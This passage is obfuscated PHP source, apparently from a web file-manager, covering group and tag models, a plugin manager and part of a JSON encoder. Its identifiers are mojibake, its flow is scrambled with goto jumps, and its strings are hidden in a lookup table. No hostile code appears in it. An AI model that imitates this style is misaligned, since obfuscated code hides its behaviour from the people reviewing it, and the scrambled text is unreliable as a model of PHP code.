unset($fÙğÜœ™¿¯); goto aºìáˆÉÛã; eèÇÛ•ÉêÈ: if ($d±æƒÖ¹‡Œ) { $BëÛøìñô = array($E¿µ—„óèŠ[2215] => array($E¿µ—„óèŠ[409], $d±æƒÖ¹‡Œ)); $fºï¿¡Ö“Ú = $this->field($E¿µ—„óèŠ[2228])->where($BëÛøìñô)->select(); $E…Ğ‚¶‚‹º = array_to_keyvalue($fºï¿¡Ö“Ú, $E¿µ—„óèŠ[2138], $E¿µ—„óèŠ[28]); $Eê¶‰ä¼¿Œ = array_merge_index($Eê¶‰ä¼¿Œ, $E…Ğ‚¶‚‹º); } $a‘ô¥šß»» = $GLOBALS[$E¿µ—„óèŠ[6]][$E¿µ—„óèŠ[84]][$E¿µ—„óèŠ[2229]]; foreach ($AÖ§Õ›¸ˆ· as &$fÙğÜœ™¿¯) { $C÷¢Ù—É×Û = $this->parentLevelArray($fÙğÜœ™¿¯[$E¿µ—„óèŠ[485]]); $A‰ïÏº©é = $E¿µ—„óèŠ[33]; foreach ($C÷¢Ù—É×Û as $eÑÂ³À‡Ôß => $B“ïª¾ˆÎã) { if ($a‘ô¥šß»» && $eÑÂ³À‡Ôß == 0) { continue; } $A‰ïÏº©é .= $Eê¶‰ä¼¿Œ[$B“ïª¾ˆÎã] . $E¿µ—„óèŠ[8]; } if ($C÷¢Ù—É×Û) { $A‰ïÏº©é .= $fÙğÜœ™¿¯[$E¿µ—„óèŠ[28]]; } $fÙğÜœ™¿¯[$E¿µ—„óèŠ[489]] = str_replace($E¿µ—„óèŠ[493], $E¿µ—„óèŠ[8], $A‰ïÏº©é); } goto cÙ´òåò¼Ø; aºìáˆÉÛã: } private function _listAppendSourceRoot(&$EåÊº‹ÏÊ, $b‡‚í´öÙ‡) { goto a‡ùôè¯÷; d¨Óˆ“Ÿ—»: foreach ($EåÊº‹ÏÊ as &$côŞ‹Šíœ«) { $côŞ‹Šíœ«[$DµÃî™µä[416]] = $aÆØ·²öÒ›[$côŞ‹Šíœ«[$DµÃî™µä[2138]]] ? $aÆØ·²öÒ›[$côŞ‹Šíœ«[$DµÃî™µä[2138]]] : array(); } unset($côŞ‹Šíœ«); goto f¿ğ†—Š¬; a‡ùôè¯÷: $DµÃî™µä =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÌ„‰ÅÜ‘¢ = array($DµÃî™µä[396] => SourceModel::TYPE_GROUP, $DµÃî™µä[487] => 0, $DµÃî™µä[482] => array($DµÃî™µä[7], $b‡‚í´öÙ‡)); $aÉ…ºÏÆË¥ = $DµÃî™µä[2230]; goto fó¶ïğŸë; fó¶ïğŸë: $aÆØ·²öÒ› = Model($DµÃî™µä[778])->order($DµÃî™µä[2231])->field($aÉ…ºÏÆË¥)->where($eÌ„‰ÅÜ‘¢)->select(); $aÆØ·²öÒ› = array_to_keyvalue($aÆØ·²öÒ›, $DµÃî™µä[482]); $aÆØ·²öÒ› = array_remove_key($aÆØ·²öÒ›, $DµÃî™µä[482]); goto d¨Óˆ“Ÿ—»; f¿ğ†—Š¬: } protected function groupMerge($DÎì„ãè¶í) { $DÎì„ãè¶í = array_values(array_unique($DÎì„ãè¶í)); $bÉ‰ñ¨ÉŸ = array(); for ($céƒá‘ØÎ = 0; $céƒá‘ØÎ < count($DÎì„ãè¶í); $céƒá‘ØÎ++) { $C„º­Ù‚ğ  = !1; for ($CèîÈ• ¼Á = 0; $CèîÈ• ¼Á < count($DÎì„ãè¶í); $CèîÈ• ¼Á++) { if ($céƒá‘ØÎ == $CèîÈ• ¼Á) { continue; } if ($this->isParentOf($DÎì„ãè¶í[$CèîÈ• ¼Á], $DÎì„ãè¶í[$céƒá‘ØÎ])) { $C„º­Ù‚ğ  = !0; break; } } if (!$C„º­Ù‚ğ ) { $bÉ‰ñ¨ÉŸ[] = $DÎì„ãè¶í[$céƒá‘ØÎ]; } } return $bÉ‰ñ¨ÉŸ; } protected function isParentOf($B…®ƒÚßêÃ, $Cù…ìÌÔî ) { goto Fá¸Û¤¤Å; E‡Š³â¬ô: return !1; goto C¶ê¬¢Œ—‡; e»è—ÅÔâä: $c•¬Ğ“àÆˆ = $this->getInfoSimple($Cù…ìÌÔî ); $AÃ§Ÿæİ²Ì = $f£šá°„ò¨[$eñÒ³´Á®[485]] . $B…®ƒÚßêÃ . $eñÒ³´Á®[47]; if (substr($c•¬Ğ“àÆˆ[$eñÒ³´Á®[485]], 0, strlen($AÃ§Ÿæİ²Ì)) == $AÃ§Ÿæİ²Ì) { return !0; } goto E‡Š³â¬ô; Fá¸Û¤¤Å: $eñÒ³´Á® =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$B…®ƒÚßêÃ || !$Cù…ìÌÔî  || $B…®ƒÚßêÃ == $Cù…ìÌÔî ) { return !1; } $f£šá°„ò¨ = $this->getInfoSimple($B…®ƒÚßêÃ); goto e»è—ÅÔâä; C¶ê¬¢Œ—‡: } public function groupShowRoot($aæ©…êØ†Î, $fÌÒÇò·ïé = false) { goto a‘¼ÔÀ¦¡‰; AÄèùè±íò: return $BÕ¥Ì¸´³¬; goto fÒ–İÌ”ó; a‘¼ÔÀ¦¡‰: $eŸ¹ÊîÆî¬ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aÎáœè…ö® = $this->getInfo($aæ©…êØ†Î); if (!$aÎáœè…ö®) { return array(); } goto c•â’ÌÀ¦; EíìïØÍ¥: if ($fÌÒÇò·ïé && count($B™¸…­Æ) == 1) { return $BÕ¥Ì¸´³¬; } if (!$aÎáœè…ö®[$eŸ¹ÊîÆî¬[442]] || !isset($aÎáœè…ö®[$eŸ¹ÊîÆî¬[442]][$eŸ¹ÊîÆî¬[2213]]) || $aÎáœè…ö®[$eŸ¹ÊîÆî¬[442]][$eŸ¹ÊîÆî¬[2213]] == $eŸ¹ÊîÆî¬[2187]) { return $this->groupShowRoot($B™¸…­Æ[count($B™¸…­Æ) - 1], $fÌÒÇò·ïé); } if ($aÎáœè…ö®[$eŸ¹ÊîÆî¬[442]][$eŸ¹ÊîÆî¬[2213]] == $eŸ¹ÊîÆî¬[362]) { $a¥Œ´¯Ò¡ = explode($eŸ¹ÊîÆî¬[47], $aÎáœè…ö®[$eŸ¹ÊîÆî¬[442]][$eŸ¹ÊîÆî¬[2214]]); if ($a¥Œ´¯Ò¡) { $BÕ¥Ì¸´³¬ = array_merge($BÕ¥Ì¸´³¬, $a¥Œ´¯Ò¡); } } goto AÄèùè±íò; c•â’ÌÀ¦: $B™¸…­Æ = $this->parentLevelArray($aÎáœè…ö®[$eŸ¹ÊîÆî¬[485]]); $BÕ¥Ì¸´³¬ = array($aæ©…êØ†Î); if (count($B™¸…­Æ) == 0) { return $BÕ¥Ì¸´³¬; } goto EíìïØÍ¥; fÒ–İÌ”ó: } protected function resetParentLevel() { $aÃˆééŒåô =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÃÙÄ§—°Ô = $aÃˆééŒåô[2138]; $aÌÅš³  = $this->select(); $aÌÅš³  = array_to_keyvalue($aÌÅš³ , $eÃÙÄ§—°Ô); foreach ($aÌÅš³  as $fË…½êÓ„¹) { goto dŠ¦ŒÔ‡‡Ú; B‘„¬Õ½¼: $this->where(array($eÃÙÄ§—°Ô => $fË…½êÓ„¹[$eÃÙÄ§—°Ô]))->save(array($aÃˆééŒåô[551] => $b»‘¨‡ ¿Æ)); goto d†õØàÀåó; dŠ¦ŒÔ‡‡Ú: $A¥å‹ùŒÁ = $fË…½êÓ„¹; $b»‘¨‡ ¿Æ = array(); while ($A¥å‹ùŒÁ[$aÃˆééŒåô[487]] != 0) { $b»‘¨‡ ¿Æ[] = $A¥å‹ùŒÁ[$aÃˆééŒåô[487]]; $A¥å‹ùŒÁ = $aÌÅš³ [$A¥å‹ùŒÁ[$aÃˆééŒåô[487]]]; } goto D¿ç¤øø; D¿ç¤øø: $b»‘¨‡ ¿Æ[] = 0; $b»‘¨‡ ¿Æ = $aÃˆééŒåô[47] . implode($aÃˆééŒåô[47], array_reverse($b»‘¨‡ ¿Æ)) . $aÃˆééŒåô[47]; $this->setNamePinyin($fË…½êÓ„¹[$eÃÙÄ§—°Ô], $fË…½êÓ„¹[$aÃˆééŒåô[28]]); goto B‘„¬Õ½¼; d†õØàÀåó: } return $aÌÅš³ ; } public function groupNameAuto($DßÚ†Ó©†ª, $e×—¯»¬ƒ) { $cô¬õ…ê¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e“Õ”²×™° = $this->where(array($cô¬õ…ê¨[393] => $DßÚ†Ó©†ª))->getField($cô¬õ…ê¨[28], !0); if (!$e“Õ”²×™° || !in_array($e×—¯»¬ƒ, $e“Õ”²×™°)) { return $e×—¯»¬ƒ; } for ($d“áå„†ª§ = 1; $d“áå„†ª§ <= count($e“Õ”²×™°) + 1; $d“áå„†ª§++) { $EÄË¬„ŒÔ = $e×—¯»¬ƒ . "\50{$d“áå„†ª§}\x29"; if (!in_array($EÄË¬„ŒÔ, $e“Õ”²×™°)) { return $EÄË¬„ŒÔ; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($C»ÒÖöØĞ•) { $Bç°«˜£ÁŒ =& $_SERVER[åÌÛ»ô¢‚ö™]; return array($Bç°«˜£ÁŒ[2232] => array($C»ÒÖöØĞ•[0], $Bç°«˜£ÁŒ[2233]), $Bç°«˜£ÁŒ[2234] => array($C»ÒÖöØĞ•[0], $Bç°«˜£ÁŒ[2235])); } protected function get($d‚ãÀ‰Ñç©) { $a›¢É¼ŠÂ… =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fá¼«ŒÉ = Model($a›¢É¼ŠÂ…[484])->metaGet($d‚ãÀ‰Ñç©, $a›¢É¼ŠÂ…[2236]); $D¸Ò¦†ŠºÎ = json_decode($Fá¼«ŒÉ, !0); return $D¸Ò¦†ŠºÎ ? $D¸Ò¦†ŠºÎ : array($a›¢É¼ŠÂ…[2237] => $a›¢É¼ŠÂ…[83], $a›¢É¼ŠÂ…[370] => array()); } protected function set($D¨¸î÷¡‰ß, $eâª·ÈÜ´) { $c³‹´È =& $_SERVER[åÌÛ»ô¢‚ö™]; $eâª·ÈÜ´ = $eâª·ÈÜ´ ? $eâª·ÈÜ´ : array($c³‹´È[2237] => $c³‹´È[83], $c³‹´È[370] => array()); Model($c³‹´È[484])->metaSet($D¨¸î÷¡‰ß, $c³‹´È[2236], json_encode($eâª·ÈÜ´)); return Model($c³‹´È[484])->metaSet($D¨¸î÷¡‰ß, $c³‹´È[2236], json_encode($eâª·ÈÜ´)); } protected function getByTagID($dˆ‘ËŒ†ß, $B‹»®ºƒëÍ) { goto e±àŠ‚ÀÅ; fÁ»ÆÜÜË¡: $f­½î»é²‚ = $this->get($dˆ‘ËŒ†ß); if (!$f­½î»é²‚ || !isset($f­½î»é²‚[$DòÖª¿İöâ[370]])) { return !1; } $e„Ç¶ùŸ¥ = array_find_by_field($f­½î»é²‚[$DòÖª¿İöâ[370]], $DòÖª¿İöâ[392], $B‹»®ºƒëÍ); goto aßÓ§³´ù®; e±àŠ‚ÀÅ: $DòÖª¿İöâ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$dˆ‘ËŒ†ß || !$B‹»®ºƒëÍ) { return !1; } if (!Model($DòÖª¿İöâ[484])->getInfoSimple($dˆ‘ËŒ†ß)) { return !1; } goto fÁ»ÆÜÜË¡; aßÓ§³´ù®: return is_array($e„Ç¶ùŸ¥) ? $e„Ç¶ùŸ¥ : !1; goto FÕŸÂÆôšã; FÕŸÂÆôšã: } public function listSource($b‘Ğ±¤™Êä, $aøÏ‚é¤Ò) { goto f¬˜Ê—ä; f¬˜Ê—ä: $bÖÑäï¹ÛÓ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($aøÏ‚é¤Ò && !is_array($aøÏ‚é¤Ò)) { $aøÏ‚é¤Ò = array($aøÏ‚é¤Ò); } $c¸ÔƒØšÍ¡ = $this->listData($b‘Ğ±¤™Êä); goto bÛ‡¤¶ëÉ‚; bÛ‡¤¶ëÉ‚: $c˜×ˆ…¡¤ = array(); foreach ($c¸ÔƒØšÍ¡ as $A¬ö†Íõ‹£) { $d•íòİø«¹ = $A¬ö†Íõ‹£[$bÖÑäï¹ÛÓ[75]]; if (!$d•íòİø«¹) { continue; } if (!isset($c˜×ˆ…¡¤[$d•íòİø«¹])) { $c˜×ˆ…¡¤[$d•íòİø«¹] = array(); } $c˜×ˆ…¡¤[$d•íòİø«¹][] = $A¬ö†Íõ‹£[$bÖÑäï¹ÛÓ[418]]; } $cÙóòòÒº‡ = array(); goto Aà…‹¦ªàÊ; fÌšÉĞŞ: if ($aÖ“áÉ­²ä) { $this->removeBySource($b‘Ğ±¤™Êä, $aÖ“áÉ­²ä); } return $bÛ¹Ø´Ë; goto bš°Ûï‘ƒÔ; Aà…‹¦ªàÊ: foreach ($c˜×ˆ…¡¤ as $DÊçĞÜ…Ó => $dŞ‰ó¯Çô) { $fÉÛ‡è„×œ = !0; if (!$aøÏ‚é¤Ò) { $cÙóòòÒº‡[] = $DÊçĞÜ…Ó; continue; } foreach ($aøÏ‚é¤Ò as $Fá…„Ùë”ö) { if (!in_array($Fá…„Ùë”ö, $dŞ‰ó¯Çô)) { $fÉÛ‡è„×œ = !1; break; } } if ($fÉÛ‡è„×œ) { $cÙóòòÒº‡[] = $DÊçĞÜ…Ó; } } if (!$cÙóòòÒº‡) { return array(); } $bÛ¹Ø´Ë = Model($bÖÑäï¹ÛÓ[1143])->listSource(array($bÖÑäï¹ÛÓ[408] => array($bÖÑäï¹ÛÓ[409], $cÙóòòÒº‡))); goto eëß¥Ô‘„ƒ; AÅÃ‡‰‡î: $c”•ŞÈÛÊ = array_to_keyvalue($bÛ¹Ø´Ë[$bÖÑäï¹ÛÓ[73]], $bÖÑäï¹ÛÓ[33], $bÖÑäï¹ÛÓ[394]); $AŠÌ˜êêµÖ = array_merge($c”•ŞÈÛÊ, $bâœÀšãõ); foreach ($cÙóòòÒº‡ as $d•íòİø«¹) { if (!in_array($d•íòİø«¹, $AŠÌ˜êêµÖ)) { $aÖ“áÉ­²ä[] = $d•íòİø«¹; } } goto fÌšÉĞŞ; eëß¥Ô‘„ƒ: if (!$bÛ¹Ø´Ë || count($cÙóòòÒº‡) == $bÛ¹Ø´Ë[$bÖÑäï¹ÛÓ[367]][$bÖÑäï¹ÛÓ[368]]) { return $bÛ¹Ø´Ë; } $aÖ“áÉ­²ä = array(); $bâœÀšãõ = array_to_keyvalue($bÛ¹Ø´Ë[$bÖÑäï¹ÛÓ[74]], $bÖÑäï¹ÛÓ[33], $bÖÑäï¹ÛÓ[394]); goto AÅÃ‡‰‡î; bš°Ûï‘ƒÔ: } protected function listData($BëóîĞ•¶) { $cÜ—áó†ë =& $_SERVER[åÌÛ»ô¢‚ö™]; $B„ËÂ…×´ = array($cÜ—áó†ë[1457] => 0, $cÜ—áó†ë[460] => array($cÜ—áó†ë[2238], 0), $cÜ—áó†ë[413] => $cÜ—áó†ë[2239] . $BëóîĞ•¶); $b†—§› Îğ = $cÜ—áó†ë[2240]; $fÊö‘‰†íÙ = $this->field($b†—§› Îğ)->where($B„ËÂ…×´)->order($cÜ—áó†ë[2241])->select(); return $fÊö‘‰†íÙ ? $fÊö‘‰†íÙ : array(); } protected function addToTag($AÑˆ†…ŠéÅ, $B°›î±, $eíİÑİŞëé) { $CŠğ‚ÅÉ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->getByTagID($AÑˆ†…ŠéÅ, $eíİÑİŞëé) || !$B°›î±) { return !1; } if (!Model($CŠğ‚ÅÉ[778])->pathInfo($B°›î±)) { return !1; } $E¤®é‹»Š° = array($CŠğ‚ÅÉ[1457] => 0, $CŠğ‚ÅÉ[460] => $eíİÑİŞëé, $CŠğ‚ÅÉ[412] => $B°›î±, $CŠğ‚ÅÉ[413] => $CŠğ‚ÅÉ[2242] . $AÑˆ†…ŠéÅ, $CŠğ‚ÅÉ[411] => $CŠğ‚ÅÉ[33], $CŠğ‚ÅÉ[2142] => 0); if ($this->where($E¤®é‹»Š°)->find()) { return !1; } return $this->add($E¤®é‹»Š°); } protected function removeFromTag($B¬Ê‘åù¸é, $eÌğÇèé, $cÔÙ¾ñî´ˆ) { $B³Æ›òªî‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->getByTagID($B¬Ê‘åù¸é, $cÔÙ¾ñî´ˆ) || !$eÌğÇèé) { return !1; } if (is_array($eÌğÇèé)) { $eÌğÇèé = array($B³Æ›òªî‘[7], $eÌğÇèé); } $A²Ø†«µÛ = array($B³Æ›òªî‘[1457] => 0, $B³Æ›òªî‘[460] => $cÔÙ¾ñî´ˆ, $B³Æ›òªî‘[413] => $B³Æ›òªî‘[2242] . $B¬Ê‘åù¸é, $B³Æ›òªî‘[412] => $eÌğÇèé); return $this->where($A²Ø†«µÛ)->delete(); } protected function removeByTag($AËø˜ÁÖ , $f£“¿ã™) { $EÓğ˜ØÛÕ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->getByTagID($AËø˜ÁÖ , $f£“¿ã™)) { return !1; } $A“×Àê“À = array($EÓğ˜ØÛÕ[1457] => 0, $EÓğ˜ØÛÕ[460] => $f£“¿ã™, $EÓğ˜ØÛÕ[413] => $EÓğ˜ØÛÕ[2242] . $AËø˜ÁÖ ); return $this->where($A“×Àê“À)->delete(); } protected function removeBySource($E©‰’”øÇª, $DæÆÒçß¬ï) { $Cª’ªôîŠ§ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$E©‰’”øÇª || !$DæÆÒçß¬ï) { return !1; } if (is_array($DæÆÒçß¬ï)) { $DæÆÒçß¬ï = array($Cª’ªôîŠ§[7], $DæÆÒçß¬ï); } $cÖó‚Îå = array($Cª’ªôîŠ§[1457] => 0, $Cª’ªôîŠ§[412] => $DæÆÒçß¬ï, $Cª’ªôîŠ§[460] => array($Cª’ªôîŠ§[949], 0), $Cª’ªôîŠ§[413] => $Cª’ªôîŠ§[2242] . $E©‰’”øÇª); return $this->where($cÖó‚Îå)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x70\x6c\x75\x67\x69\156\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\163\x74\141\x74\165\x73", "\162\x65\147\151\x65\x73\x74", "\143\157\x6e\x66\151\147"); public function loadList($cé„ŠÏ±ãŠ = false) { $aù¡šÏŠ¥” = array_to_keyvalue($this->listData(), $_SERVER[åÌÛ»ô¢‚ö™][28]); if ($cé„ŠÏ±ãŠ) { return $aù¡šÏŠ¥”[$cé„ŠÏ±ãŠ]; } return $aù¡šÏŠ¥”; } public function init() { $bÌ¹¦Òåò¶ =& $_SERVER[åÌÛ»ô¢‚ö™]; Hook::trigger($bÌ¹¦Òåò¶[2243]); $a„’ôºå¡Ü = $this->loadPluginList(); foreach ($a„’ôºå¡Ü as $eÅ¼š“§¤” => $CÎ¾œºçÅä) { $Dòİ½Ï„‰ = $this->appAllow($eÅ¼š“§¤”, $CÎ¾œºçÅä); if (!$Dòİ½Ï„‰) { continue; } foreach ($CÎ¾œºçÅä[$bÌ¹¦Òåò¶[2244]] as $Eøì°ñˆå‰ => $eº³•¿Şó) { Hook::bind($Eøì°ñˆå‰, $eº³•¿Şó); } } Hook::trigger($bÌ¹¦Òåò¶[2245]); Hook::trigger(ACTION); } public function appAllow($A´ªå¼ŸŒ, $d¹¯£½‚–´, $b„ØÑ“±¶ã = true) { $aÕµÏ‡¥± =& $_SERVER[åÌÛ»ô¢‚ö™]; $e‡ï´ƒŞòÉ = PLUGIN_DIR . $A´ªå¼ŸŒ . $aÕµÏ‡¥±[2246]; if (!is_array($d¹¯£½‚–´) || !is_array($d¹¯£½‚–´[$aÕµÏ‡¥±[2244]]) || !is_file($e‡ï´ƒŞòÉ) || $d¹¯£½‚–´[$aÕµÏ‡¥±[716]] != 1) { return !1; } if ($b„ØÑ“±¶ã && !Action($aÕµÏ‡¥±[2247])->checkAuth($A´ªå¼ŸŒ)) { return !1; } return !0; } public function unInstall($fí¼ğ½ĞœÏ) { $E º§óÚª× =& $_SERVER[åÌÛ»ô¢‚ö™]; $bîÆÙ¥’— = $this->loadList($fí¼ğ½ĞœÏ); if (file_exists(PLUGIN_DIR . $fí¼ğ½ĞœÏ)) { Hook::apply($fí¼ğ½ĞœÏ . $E º§óÚª×[2248]); } $this->remove($bîÆÙ¥’—[$E º§óÚª×[392]]); } public function changeStatus($fßÎ—‹˜‚ß, $dñá‰ôÜ‰) { $eÄÙ¤œİëØ =& $_SERVER[åÌÛ»ô¢‚ö™]; $AÖ¦ÅòÈ¸ = $this->loadList($fßÎ—‹˜‚ß); if ($dñá‰ôÜ‰) { Hook::apply($fßÎ—‹˜‚ß . $eÄÙ¤œİëØ[2249]); } $this->update($AÖ¦ÅòÈ¸[$eÄÙ¤œİëØ[392]], array($eÄÙ¤œİëØ[2250] => $dñá‰ôÜ‰)); } public function appRegist($e‘›Â¨Ì˜¬, $FÈôàë…‡) { $eí°¸Ÿğ¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b¹·©™Éø£ = $this->loadList($e‘›Â¨Ì˜¬); if ($b¹·©™Éø£) { $this->update($b¹·©™Éø£[$eí°¸Ÿğ¨[392]], array($eí°¸Ÿğ¨[2244] => $FÈôàë…‡)); } else { $FÃÔÂ×’®Î = array($eí°¸Ÿğ¨[28] => $e‘›Â¨Ì˜¬, $eí°¸Ÿğ¨[2244] => $FÈôàë…‡, $eí°¸Ÿğ¨[716] => 0, $eí°¸Ÿğ¨[6] => $this->getConfigDefault($e‘›Â¨Ì˜¬)); $this->insert($FÃÔÂ×’®Î); } } public function getConfigDefault($EíÕÃ„ÑÈì) { $EÈ‰æĞ‹Êå =& $_SERVER[åÌÛ»ô¢‚ö™]; $EË‹”Âô† = array(); $E‰êÅ÷ò·Á = $this->getPackageJson($EíÕÃ„ÑÈì); if (!$E‰êÅ÷ò·Á && is_array($E‰êÅ÷ò·Á[$EÈ‰æĞ‹Êå[2251]])) { return $EË‹”Âô†; } foreach ($E‰êÅ÷ò·Á[$EÈ‰æĞ‹Êå[2251]] as $f“ŒÃ¿ÑğÒ => $d¨ÆŞ…¶ù) { if (!isset($d¨ÆŞ…¶ù[$EÈ‰æĞ‹Êå[375]]) || isset($EË‹”Âô†[$f“ŒÃ¿ÑğÒ])) { continue; } $EË‹”Âô†[$f“ŒÃ¿ÑğÒ] = $d¨ÆŞ…¶ù[$EÈ‰æĞ‹Êå[375]]; } return $EË‹”Âô†; } public function getPackageJson($eà»¤Á©Ÿî) { return Hook::apply($eà»¤Á©Ÿî . $_SERVER[åÌÛ»ô¢‚ö™][2252]); } public function getConfig($AĞ¦ê‹ÑÆ¿, $A‚¥µÈ»ÖŒ = false) { $d“åæ°ˆñ‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; $CÁ˜·™Ö‰ñ = array(); $DÜÀ®¼‹ò = $this->loadList($AĞ¦ê‹ÑÆ¿); if ($DÜÀ®¼‹ò && is_array($DÜÀ®¼‹ò[$d“åæ°ˆñ‘[6]])) { $CÁ˜·™Ö‰ñ = $DÜÀ®¼‹ò[$d“åæ°ˆñ‘[6]]; } if (!$CÁ˜·™Ö‰ñ || $A‚¥µÈ»ÖŒ) { $CÁ˜·™Ö‰ñ = $this->getConfigDefault($AĞ¦ê‹ÑÆ¿); } return $CÁ˜·™Ö‰ñ; } public function setConfig($A¹·Á‘µã, $a†Äš•àî = false) { goto A—¬œ« ÚÅ; A‘¯‹«£‚´: $BË¢õÒœÕ = $C†­«Ï†”Ì[$Aª¶‡èİ‡š[6]]; if ($a†Äš•àî == !1) { $BË¢õÒœÕ = array(); $a†Äš•àî = $this->getConfigDefault($A¹·Á‘µã); } foreach ($a†Äš•àî as $b¥‚Ö²·Ø© => $C†ˆÆœ‘šò) { $BË¢õÒœÕ[$b¥‚Ö²·Ø©] = is_string($C†ˆÆœ‘šò) ? trim($C†ˆÆœ‘šò) : $C†ˆÆœ‘šò; } goto bòË‘¾İçô; A—¬œ« ÚÅ: $Aª¶‡èİ‡š =& $_SERVER[åÌÛ»ô¢‚ö™]; $C†­«Ï†”Ì = $this->loadList($A¹·Á‘µã); if (!$C†­«Ï†”Ì) { return !1; } goto A‘¯‹«£‚´; bòË‘¾İçô: $this->update($C†­«Ï†”Ì[$Aª¶‡èİ‡š[392]], array($Aª¶‡èİ‡š[6] => $BË¢õÒœÕ)); goto b‘·À‹³„æ; b‘·À‹³„æ: } public function viewList() { goto E÷¹²Ê¯ˆ±; E÷¹²Ê¯ˆ±: $C†æË‚ÚÏ =& $_SERVER[åÌÛ»ô¢‚ö™]; $C±Ñ¢©ò“„ = $this->loadList(); $this->pluginScan($C±Ñ¢©ò“„); goto a»‡£ç¢éŒ; cÆæˆë‘ë§: return $B•¥àì†°; goto dí¼ë÷ëù‘; a»‡£ç¢éŒ: $C±Ñ¢©ò“„ = $this->loadPluginList(); $B•¥àì†° = array(); foreach ($C±Ñ¢©ò“„ as $eñˆöŸØİ¢ => $bËùù‚™) { unset($bËùù‚™[$C†æË‚ÚÏ[2244]], $bËùù‚™[$C†æË‚ÚÏ[6]]); $bÍôÍ÷Æ¦¼ = PLUGIN_DIR . $bËùù‚™[$C†æË‚ÚÏ[28]] . $C†æË‚ÚÏ[2246]; if (!is_file($bÍôÍ÷Æ¦¼)) { continue; } $aˆŒ§àÅƒê = Hook::apply($bËùù‚™[$C†æË‚ÚÏ[28]] . $C†æË‚ÚÏ[2252]); if (is_array($aˆŒ§àÅƒê)) { $B•¥àì†°[$eñˆöŸØİ¢] = array_merge($bËùù‚™, $aˆŒ§àÅƒê); } } goto cÆæˆë‘ë§; dí¼ë÷ëù‘: } private function loadPluginList() { $d—ÍÀö¡í =& $_SERVER[åÌÛ»ô¢‚ö™]; $a—é‡•¶‘Õ = $this->loadList(); if (strtolower(MOD) == $d—ÍÀö¡í[2253]) { return $a—é‡•¶‘Õ; } $Eİ‘…ğ¶ŒË = Hook::trigger($d—ÍÀö¡í[2254], $a—é‡•¶‘Õ); if ($a—é‡•¶‘Õ && !$Eİ‘…ğ¶ŒË) { die; } return $Eİ‘…ğ¶ŒË ? $Eİ‘…ğ¶ŒË : $a—é‡•¶‘Õ; } private function pluginScan($Fíì»°‰µõ) { $cÁÙ‚äö¼ =& $_SERVER[åÌÛ»ô¢‚ö™]; recursion_dir(PLUGIN_DIR, $f½Ü­ëç¡·, $d¦ÂòÛÒĞ‡, 0); foreach ($f½Ü­ëç¡· as $c¶¾æò¤³à) { $b©‚¼—¢Óæ = get_path_this($c¶¾æò¤³à); if (isset($Fíì»°‰µõ[$b©‚¼—¢Óæ]) || !file_exists($c¶¾æò¤³à . $cÁÙ‚äö¼[2255]) || !file_exists($c¶¾æò¤³à . $cÁÙ‚äö¼[2246])) { continue; } Hook::apply($b©‚¼—¢Óæ . $cÁÙ‚äö¼[2249]); } } } goto DÇËí—µ®; c‚Ìº•à´ç: define($_SERVER[åÌÛ»ô¢‚ö™][1970], 16); define($_SERVER[åÌÛ»ô¢‚ö™][1971], 32); class Services_JSON { function __construct($eøøÒ³×‰ä = 0) { $this->use = $eøøÒ³×‰ä; } function utf162utf8($F¶Ä»¨‘ã) { $Eá‚¢”º”¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (function_exists($Eá‚¢”º”¹[68])) { return mb_convert_encoding($F¶Ä»¨‘ã, $Eá‚¢”º”¹[1621], $Eá‚¢”º”¹[1972]); } $bá¤Õô‹ïö = ord($F¶Ä»¨‘ã[0]) << 8 | ord($F¶Ä»¨‘ã[1]); switch (!0) { case (127 & $bá¤Õô‹ïö) == $bá¤Õô‹ïö: return chr(127 & $bá¤Õô‹ïö); case (2047 & $bá¤Õô‹ïö) == $bá¤Õô‹ïö: return chr(192 | $bá¤Õô‹ïö >> 6 & 31) . chr(128 | $bá¤Õô‹ïö & 63); case (65535 & $bá¤Õô‹ïö) == $bá¤Õô‹ïö: return chr(224 | $bá¤Õô‹ïö >> 12 & 15) . chr(128 | $bá¤Õô‹ïö >> 6 & 63) . chr(128 | $bá¤Õô‹ïö & 63); } return $Eá‚¢”º”¹[33]; } function utf82utf16($bŸ¸†¸©ªè) { $dÀ”´Í•µç =& $_SERVER[åÌÛ»ô¢‚ö™]; if (function_exists($dÀ”´Í•µç[68])) { return mb_convert_encoding($bŸ¸†¸©ªè, $dÀ”´Í•µç[1972], $dÀ”´Í•µç[1621]); } switch (strlen($bŸ¸†¸©ªè)) { case 1: return $bŸ¸†¸©ªè; case 2: return chr(7 & ord($bŸ¸†¸©ªè[0]) >> 2) . chr(192 & ord($bŸ¸†¸©ªè[0]) << 6 | 63 & ord($bŸ¸†¸©ªè[1])); case 3: return chr(240 & ord($bŸ¸†¸©ªè[0]) << 4 | 15 & ord($bŸ¸†¸©ªè[1]) >> 2) . chr(192 & ord($bŸ¸†¸©ªè[1]) << 6 | 127 & ord($bŸ¸†¸©ªè[2])); } return $dÀ”´Í•µç[33]; } function encode($F¶»—¤¥¿ˆ) { $f»¤—‡ÉŒ =& $_SERVER[åÌÛ»ô¢‚ö™]; switch (gettype($F¶»—¤¥¿ˆ)) { case $f»¤—‡ÉŒ[1631]: return $F¶»—¤¥¿ˆ ? $f»¤—‡ÉŒ[1630] : $f»¤—‡ÉŒ[1632]; case $f»¤—‡ÉŒ[1973]: return $f»¤—‡ÉŒ[99]; case $f»¤—‡ÉŒ[318]: return (int) $F¶»—¤¥¿ˆ; case $f»¤—‡ÉŒ[293]: case $f»¤—‡ÉŒ[292]: return (double) $F¶»—¤¥¿ˆ; case $f»¤—‡ÉŒ[327]: 